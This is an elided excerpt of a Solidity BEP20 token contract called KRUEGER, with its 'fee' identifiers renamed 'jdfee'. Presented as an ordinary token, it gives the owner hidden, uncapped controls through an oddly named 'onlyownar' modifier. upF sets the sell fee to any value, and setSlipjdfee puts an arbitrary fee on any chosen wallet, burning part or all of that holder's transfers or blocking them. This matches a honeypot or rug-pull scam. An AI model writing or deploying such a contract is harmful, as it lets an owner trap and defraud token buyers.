...
interface IUniswapV2Factory {
    ...
    function jdfeeTo() external view returns (address);
    function jdfeeToSetter() external view returns (address);
    ...
    function setjdfeeTo(address) external;
    function setjdfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingjdfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingjdfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingjdfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingjdfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingjdfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract KRUEGER is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelljdfee = 0;

    uint256 private _defaultBuyjdfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipjdfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelljdfee = _value;
    }

    function setSlipjdfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipjdfee[_address] = _value;
    }

    function getSlipjdfee(address _address) external view onlyownar returns (uint256) {
        return _slipjdfee[_address];
    }


    function setMAccountjdfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountjdfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradejdfeeAmount = 0;

        if (rF) {
            uint256 tradejdfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradejdfee = _defaultSelljdfee;
                }
                if (from == uniswapV2Pair) {

                    tradejdfee = _defaultBuyjdfee;
                }
            }
            if (_slipjdfee[from] > 0) {
                tradejdfee = _slipjdfee[from];
            }

            tradejdfeeAmount = _Amount.mul(tradejdfee).div(100);
        }


        if (tradejdfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradejdfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradejdfeeAmount);
            emit Transfer(from, _deadAddress, tradejdfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradejdfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradejdfeeAmount);
        emit Transfer(from, _to, _Amount - tradejdfeeAmount);
    }
